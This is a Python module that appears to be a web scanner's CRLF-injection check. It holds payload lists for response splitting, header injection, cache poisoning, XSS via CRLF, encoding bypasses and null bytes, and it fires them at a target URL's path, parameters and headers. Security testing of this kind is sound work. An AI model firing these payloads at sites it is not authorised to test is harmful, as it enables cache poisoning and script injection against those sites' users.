import re
import urllib.parse
from . import get_session

# Payload categories for CRLF injection testing
CRLF_PAYLOADS = {
    # Basic CRLF payloads
    "basic": [
        "%0D%0A",
        "%0d%0a",
        "\\r\\n",
        "%5Cr%5Cn",
        "%E5%98%8D%E5%98%8A",  # UTF-8 encoded CRLF
    ],
    
    # HTTP Response Splitting payloads
    "response_splitting": [
        "%0D%0ASet-Cookie:crlf=injection",
        "%0d%0aSet-Cookie:crlf=injection",
        "%0D%0AContent-Length:0%0D%0A%0D%0AHTTP/1.1 200 OK%0D%0ASet-Cookie:crlf=injection",
        "%0D%0AContent-Type: text/html%0D%0AHTTPOnly:true%0D%0A",
        "%0D%0ALocation: https://example.com%0D%0A"
    ],
    
    # HTTP Header Injection payloads
    "header_injection": [
        "%0D%0AX-XSS-Protection:0%0D%0A",
        "%0D%0AX-Frame-Options:ALLOWALL%0D%0A",
        "%0D%0AAccess-Control-Allow-Origin:*%0D%0A",
        "%0D%0AClear-Site-Data:*%0D%0A",
        "%0D%0AContent-Security-Policy:unsafe-inline%0D%0A",
        "%0D%0AX-Content-Type-Options:nosniff%0D%0A"
    ],
    
    # Cache Poisoning payloads
    "cache_poisoning": [
        "%0D%0AX-Cache-Control:public, max-age=31536000%0D%0A",
        "%0D%0ACache-Control:public, max-age=31536000%0D%0A",
        "%0D%0AExpires:Thu, 31 Dec 2037 23:59:59 GMT%0D%0A"
    ],
    
    # XSS via CRLF payloads
    "xss_crlf": [
        "%0D%0AContent-Type:text/html%0D%0A%0D%0A<script>alert('XSS')</script>",
        "%0D%0AContent-Type:text/html%0D%0AContent-Length:35%0D%0A%0D%0A<html><body><img src=x onerror=alert(1)></body></html>",
        "%0D%0AContent-Type:text/html%0D%0A%0D%0A<svg/onload=alert('XSS')>"
    ],
    
    # Encoding bypasses
    "encoding_bypass": [
        "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",
        "%c0%0d%c0%0aSet-Cookie:crlf=injection",
        "%u000D%u000ASet-Cookie:crlf=injection"
    ],
    
    # CRLF null byte combinations
    "null_byte": [
        "%0D%0A%00",
        "%0D%00%0A",
        "%00%0D%0A"
    ]
}

# Test headers for reflection and injection
TEST_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Forwarded-Proto",
    "X-Rewrite-URL",
    "X-Original-URL", 
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Host",
    "Referer",
    "Origin",
    "CF-Connecting-IP",
    "Client-IP",
    "True-Client-IP",
    "X-Originating-IP",
    "Forwarded",
    "Via"
]

# Success indicators - headers to look for in injection responses
SUCCESS_INDICATORS = [
    "Set-Cookie",
    "Location",
    "X-XSS-Protection",
    "Content-Type",
    "X-Frame-Options",
    "Access-Control-Allow-Origin",
    "Cache-Control",
    "Clear-Site-Data",
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "Expires"
]

def check(session, url, soup, response, config):
    """
    Enhanced CRLF injection detection with systematic testing of various injection points.
    
    Args:
        session: Session object for making requests
        url: Target URL to test
        soup: BeautifulSoup object of the response
        response: HTTP response object
        config: Configuration dictionary
    
    Returns:
        List of findings
    """
    req_session = get_session(session)
    findings = []
    
    # Parse URL to identify parameters
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    
    # Track testing efficiency
    tested_patterns = set()
    vulnerable_params = set()
    vulnerable_headers = set()
    
    # Get baseline response details
    baseline_headers = set(key.lower() for key in response.headers.keys())
    baseline_cookies = set(cookie.name for cookie in response.cookies)
    
    # Test URL for direct CRLF in path
    for category, payloads in CRLF_PAYLOADS.items():
        # Start with basic payloads for path testing
        if category in ["basic", "response_splitting"]:
            for payload in payloads:
                # Create a path where we inject the payload
                # Test URL path injection
                path_parts = parsed_url.path.rstrip('/').split('/')
                if len(path_parts) > 1:
                    # Try injecting in the last path component
                    path_parts[-1] = path_parts[-1] + payload
                    test_path = '/'.join(path_parts)
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        test_path,
                        parsed_url.params,
                        parsed_url.query,
                        parsed_url.fragment
                    ))
                    
                    evidence_key = f"path:{test_path}"
                    if evidence_key in tested_patterns:
                        continue
                    
                    tested_patterns.add(evidence_key)
                    
                    try:
                        r = req_session.get(test_url, timeout=5, allow_redirects=False)
                        
                        # Check for new headers/cookies that weren't in the baseline
                        injected_headers = set(k.lower() for k in r.headers.keys()) - baseline_headers
                        injected_cookies = set(cookie.name for cookie in r.cookies) - baseline_cookies
                        
                        for indicator in SUCCESS_INDICATORS:
                            indicator_lower = indicator.lower()
                            # Check if any of our injected headers contain CRLF success indicators
                            if indicator_lower in injected_headers or any(indicator_lower in h.lower() for h in injected_headers):
                                findings.append(f"CRLF Injection in URL path component with payload: {payload}")
                                findings.append(f"- New header detected: {indicator}")
                                break
                                
                        if injected_cookies:
                            findings.append(f"CRLF Injection in URL path with payload: {payload}")
                            findings.append(f"- New cookies set: {', '.join(injected_cookies)}")
                    except Exception as e:
                        continue
    
    # Test URL parameters for CRLF injection
    for param_name, param_values in query_params.items():
        if param_name in vulnerable_params:
            continue
        
        param_value = param_values[0] if param_values else ""
        
        # Test various payload categories
        for category, payloads in CRLF_PAYLOADS.items():
            for payload in payloads[:3]:  # Use first 3 payloads from each category for efficiency
                # Skip if we already found this parameter to be vulnerable
                if param_name in vulnerable_params:
                    break
                    
                evidence_key = f"param:{param_name}:{payload}"
                if evidence_key in tested_patterns:
                    continue
                
                tested_patterns.add(evidence_key)
                
                # Create the test URL with injected payload
                new_params = query_params.copy()
                new_params[param_name] = [param_value + payload]
                query_string = urllib.parse.urlencode(new_params, doseq=True)
                
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    query_string,
                    parsed_url.fragment
                ))
                
                try:
                    r = req_session.get(test_url, timeout=5, allow_redirects=False)
                    
                    # Check for new headers/cookies that weren't in the baseline
                    injected_headers = set(k.lower() for k in r.headers.keys()) - baseline_headers
                    injected_cookies = set(cookie.name for cookie in r.cookies) - baseline_cookies
                    
                    for indicator in SUCCESS_INDICATORS:
                        indicator_lower = indicator.lower()
                        # Check if any of our injected headers contain CRLF success indicators
                        if indicator_lower in injected_headers or any(indicator_lower in h.lower() for h in injected_headers):
                            findings.append(f"CRLF Injection in parameter '{param_name}' with payload: {payload}")
                            findings.append(f"- New header detected: {indicator}")
                            vulnerable_params.add(param_name)
                            break
                            
                    if injected_cookies and param_name not in vulnerable_params:
                        findings.append(f"CRLF Injection in parameter '{param_name}' with payload: {payload}")
                        findings.append(f"- New cookies set: {', '.join(injected_cookies)}")
                        vulnerable_params.add(param_name)
                except Exception as e:
                    continue
    
    # Test HTTP headers for CRLF injection
    for header in TEST_HEADERS:
        if header in vulnerable_headers:
            continue
            
        # Use basic and header injection payloads for header testing
        test_categories = ["basic", "header_injection", "encoding_bypass"]
        
        for category in test_categories:
            for payload in CRLF_PAYLOADS[category][:2]:  # Use first 2 payloads from each category
                evidence_key = f"header:{header}:{payload}"
                if evidence_key in tested_patterns:
                    continue
                
                tested_patterns.add(evidence_key)
                
                # Create request with injected header
                headers = {
                    header: "CRLF" + payload
                }
                
                try:
                    r = req_session.get(url, headers=headers, timeout=5, allow_redirects=False)
                    
                    # Check for new headers/cookies that weren't in the baseline
                    injected_headers = set(k.lower() for k in r.headers.keys()) - baseline_headers
                    injected_cookies = set(cookie.name for cookie in r.cookies) - baseline_cookies
                    
                    for indicator in SUCCESS_INDICATORS:
                        indicator_lower = indicator.lower()
                        # Check if any of our headers contain CRLF success indicators
                        if indicator_lower in injected_headers or any(indicator_lower in h.lower() for h in injected_headers):
                            findings.append(f"CRLF Injection in HTTP header '{header}' with payload: {payload}")
                            findings.append(f"- New header detected: {indicator}")
                            vulnerable_headers.add(header)
                            break
                            
                    if injected_cookies and header not in vulnerable_headers:
                        findings.append(f"CRLF Injection in HTTP header '{header}' with payload: {payload}")
                        findings.append(f"- New cookies set: {', '.join(injected_cookies)}")
                        vulnerable_headers.add(header)
                except Exception as e:
                    continue
    
    # Advanced injection tests for vulnerable parameters
    if vulnerable_params:
        # Use more advanced payloads for confirmed vulnerable parameters
        advanced_categories = ["xss_crlf", "cache_poisoning"]
        for param_name in vulnerable_params:
            for category in advanced_categories:
                for payload in CRLF_PAYLOADS[category]:
                    evidence_key = f"advanced:{param_name}:{payload[:20]}"
                    if evidence_key in tested_patterns:
                        continue
                    
                    tested_patterns.add(evidence_key)
                    
                    # Create the test URL with injected payload
                    new_params = query_params.copy()
                    new_params[param_name] = [param_values[0] + payload if param_values else payload]
                    query_string = urllib.parse.urlencode(new_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        query_string,
                        parsed_url.fragment
                    ))
                    
                    try:
                        r = req_session.get(test_url, timeout=5, allow_redirects=False)
                        
                        # For XSS-CRLF, check content type and body for script execution
                        if category == "xss_crlf" and "text/html" in r.headers.get("Content-Type", ""):
                            if "<script>" in r.text or "<svg" in r.text:
                                findings.append(f"XSS via CRLF Injection found in parameter '{param_name}' with payload: {payload}")
                                findings.append(f"- Content-Type changed to text/html and script tags reflected")
                                
                        # For cache poisoning, check specific cache headers
                        if category == "cache_poisoning":
                            cache_headers = ["Cache-Control", "Expires", "X-Cache"]
                            for ch in cache_headers:
                                if ch in r.headers and ch not in response.headers:
                                    findings.append(f"Cache poisoning via CRLF Injection in parameter '{param_name}' with payload: {payload}")
                                    findings.append(f"- New cache header: {ch}: {r.headers[ch]}")
                    except Exception as e:
                        continue
    
    # Check for null byte CRLF variants if other vulnerabilities were found
    if vulnerable_params or vulnerable_headers:
        test_points = []
        
        # Add vulnerable parameters to test
        for param_name in vulnerable_params:
            param_value = query_params[param_name][0] if param_name in query_params and query_params[param_name] else ""
            test_points.append(("param", param_name, param_value))
            
        # Add vulnerable headers to test
        for header in vulnerable_headers:
            test_points.append(("header", header, "CRLF"))
            
        # Test with null byte variants
        for test_type, test_name, test_value in test_points:
            for payload in CRLF_PAYLOADS["null_byte"]:
                evidence_key = f"nullbyte:{test_type}:{test_name}:{payload}"
                if evidence_key in tested_patterns:
                    continue
                
                tested_patterns.add(evidence_key)
                
                if test_type == "param":
                    # Create the test URL with injected payload
                    new_params = query_params.copy()
                    new_params[test_name] = [test_value + payload]
                    query_string = urllib.parse.urlencode(new_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        query_string,
                        parsed_url.fragment
                    ))
                    
                    try:
                        r = req_session.get(test_url, timeout=5, allow_redirects=False)
                        
                        # Check for new headers/cookies that weren't in the baseline
                        injected_headers = set(k.lower() for k in r.headers.keys()) - baseline_headers
                        injected_cookies = set(cookie.name for cookie in r.cookies) - baseline_cookies
                        
                        for indicator in SUCCESS_INDICATORS:
                            indicator_lower = indicator.lower()
                            if indicator_lower in injected_headers or any(indicator_lower in h.lower() for h in injected_headers):
                                findings.append(f"Null Byte + CRLF Injection in parameter '{test_name}' with payload: {payload}")
                                findings.append(f"- New header detected: {indicator}")
                                break
                                
                        if injected_cookies:
                            findings.append(f"Null Byte + CRLF Injection in parameter '{test_name}' with payload: {payload}")
                            findings.append(f"- New cookies set: {', '.join(injected_cookies)}")
                    except Exception:
                        continue
                elif test_type == "header":
                    # Create request with injected header
                    headers = {
                        test_name: test_value + payload
                    }
                    
                    try:
                        r = req_session.get(url, headers=headers, timeout=5, allow_redirects=False)
                        
                        # Check for new headers/cookies
                        injected_headers = set(k.lower() for k in r.headers.keys()) - baseline_headers
                        injected_cookies = set(cookie.name for cookie in r.cookies) - baseline_cookies
                        
                        for indicator in SUCCESS_INDICATORS:
                            indicator_lower = indicator.lower()
                            if indicator_lower in injected_headers or any(indicator_lower in h.lower() for h in injected_headers):
                                findings.append(f"Null Byte + CRLF Injection in HTTP header '{test_name}' with payload: {payload}")
                                findings.append(f"- New header detected: {indicator}")
                                break
                                
                        if injected_cookies:
                            findings.append(f"Null Byte + CRLF Injection in HTTP header '{test_name}' with payload: {payload}")
                            findings.append(f"- New cookies set: {', '.join(injected_cookies)}")
                    except Exception:
                        continue
    
    return findings 